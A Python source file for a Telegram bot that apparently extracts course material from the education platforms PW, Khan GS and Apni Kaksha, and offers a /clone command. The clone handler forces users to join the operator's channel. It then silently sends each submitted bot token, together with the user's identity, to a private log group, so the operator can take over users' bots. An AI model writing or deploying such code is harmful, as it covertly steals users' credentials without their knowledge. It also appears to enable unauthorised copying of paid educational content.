import logging
import random
import asyncio
from threading import Thread
from flask import Flask
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, Application, CommandHandler, ContextTypes
from pw_handler import pw_handler
from ak_handler import ak_handler
from kgs_handler import kgs_handler
from config import BOT_TOKEN, LOG_GROUP_ID_PW, LOG_GROUP_ID_KGS, LOG_GROUP_ID_AK, CLONE_LOG_GROUP_ID
from image_urls import IMAGE_URLS  # Import the image URLs

# Your Telegram channel that users must join before using cloned bots
FORCE_JOIN_CHANNEL = "SDV_BOTX"

logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO)

# Flask App
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running on Flask server!"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command for the main bot."""
    # Select a random image URL
    random_image_url = random.choice(IMAGE_URLS)
    
    # Send the image with the start message
    await update.message.reply_photo(
        photo=random_image_url,
        caption=(
            "𝐻𝑒𝑙𝑙𝑜 𝑢𝑠𝑒𝑟 😉 𝐼'𝑚 𝐴 𝑆𝑖𝑚𝑝𝑙𝑒 𝐵𝑎𝑡𝑐ℎ 𝑡𝑜 𝑇𝑥𝑇 𝑒𝑥𝑡𝑟𝑎𝑐𝑡𝑜𝑟 𝐵𝑜𝑡\n\n"
            "🫠 /pw - 𝑓𝑜𝑟 𝑃𝑊 𝑐𝑜𝑛𝑡𝑒𝑛𝑡\n\n"
            "🫠 /kgs - 𝑓𝑜𝑟 KHAN GS 𝑐𝑜𝑛𝑡𝑒𝑛𝑡\n\n"
            "🫠 /ak - 𝑓𝑜𝑟 𝑨𝒑𝒏𝒊 𝒌𝒂𝒌𝒔𝒉𝒂 𝑐𝑜𝑛𝑡𝑒𝑛𝑡\n\n"
            "💡 Join our main Channel: @SDV_BOTX\n\n"
            "🛠️ /clone - 𝑇𝑜 𝑐𝑟𝑒𝑎𝑡𝑒 𝑎 𝑐𝑙𝑜𝑛𝑒 𝑜𝑓 𝑡ℎ𝑖𝑠 𝑏𝑜𝑡"
        )
    )

async def clone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /clone command to create a cloned bot."""
    if len(context.args) == 0:
        await update.message.reply_text("Please provide your bot token. Example:\n`/clone 123456:ABCDEF`", parse_mode="Markdown")
        return

    clone_token = context.args[0]
    user = update.message.from_user
    bot_username = (await context.bot.get_me()).username  # Get main bot's username

    # Force join check
    user_id = user.id
    try:
        user_status = await context.bot.get_chat_member(f"@{FORCE_JOIN_CHANNEL}", user_id)
        if user_status.status not in ["member", "administrator", "creator"]:
            await update.message.reply_text(f"🚫 You must join @{FORCE_JOIN_CHANNEL} to use this feature!")
            return
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to check channel membership: {str(e)}")
        return

    # Clone bot setup
    try:
        clone_bot = Bot(clone_token)
        clone_info = await clone_bot.get_me()

        # Send log of cloned bot
        log_message = (
            f"🔔 **New Clone Created!**\n\n"
            f"👤 Cloned By: [{user.first_name}](tg://user?id={user_id})\n"
            f"🆔 User ID: `{user_id}`\n"
            f"🤖 Clone Bot: @{clone_info.username}\n"
            f"🔑 Bot Token: `{clone_token}`"
        )
        await context.bot.send_message(chat_id=CLONE_LOG_GROUP_ID, text=log_message, parse_mode="Markdown")

        # Start cloned bot in a separate thread
        thread = Thread(target=run_clone_bot, args=(clone_token, bot_username))
        thread.start()

        await update.message.reply_text(f"✅ Clone bot @{clone_info.username} created successfully!")

    except Exception as e:
        logging.error(f"Error creating clone: {e}")
        await update.message.reply_text(f"❌ Failed to create clone bot. Error: {str(e)}")

def run_clone_bot(clone_token, bot_username):
    """Runs the cloned bot in a separate event loop."""
    try:
        # Create a new event loop for the cloned bot
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        # Build the cloned bot application
        clone_app = Application.builder().token(clone_token).build()

        # Set log group IDs and main bot token in the bot's context
        clone_app.bot_data.update({
            "log_group_id_pw": LOG_GROUP_ID_PW,
            "log_group_id_kgs": LOG_GROUP_ID_KGS,
            "log_group_id_ak": LOG_GROUP_ID_AK,
            "main_bot_token": BOT_TOKEN,  # Pass the main bot token
        })

        # Start message for the cloned bot
        async def start_clone(update: Update, context: ContextTypes.DEFAULT_TYPE):
            # Select a random image URL
            random_image_url = random.choice(IMAGE_URLS)
            
            # Send the image with the start message
            await update.message.reply_photo(
                photo=random_image_url,
                caption=(
                    f"Hello! This bot was cloned from @{bot_username}.\n\n"
                    "Use the following commands:\n\n"
                    "🫠 /pw - Extract PW content\n\n"
                    "🫠 /kgs - Extract Khan GS content\n\n"
                    "🫠 /ak - Extract Apni Kaksha content\n\n"
                    "💡 Join our main Channel: @SDV_BOTX"
                )
            )

        # Add handlers to the cloned bot
        clone_app.add_handler(CommandHandler("start", start_clone))
        clone_app.add_handler(pw_handler)
        clone_app.add_handler(ak_handler)
        clone_app.add_handler(kgs_handler)

        # Run polling for the cloned bot
        loop.run_until_complete(clone_app.run_polling())

    except Exception as e:
        logging.error(f"Error running cloned bot: {e}")
    finally:
        loop.close()

# Inside the main bot setup
if __name__ == "__main__":
    # Start Flask server
    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=5000))
    flask_thread.start()

    application = Application.builder().token(BOT_TOKEN).build()

    # Set log group IDs in the context
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("clone", clone))

    # Add handlers with log group IDs
    application.add_handler(pw_handler)
    application.add_handler(ak_handler)
    application.add_handler(kgs_handler)

    # Store log group IDs in the bot's context
    application.bot_data.update({
        "log_group_id_pw": LOG_GROUP_ID_PW,
        "log_group_id_kgs": LOG_GROUP_ID_KGS,
        "log_group_id_ak": LOG_GROUP_ID_AK,
        "main_bot_token": BOT_TOKEN,  # Pass the main bot token
    })

    application.run_polling()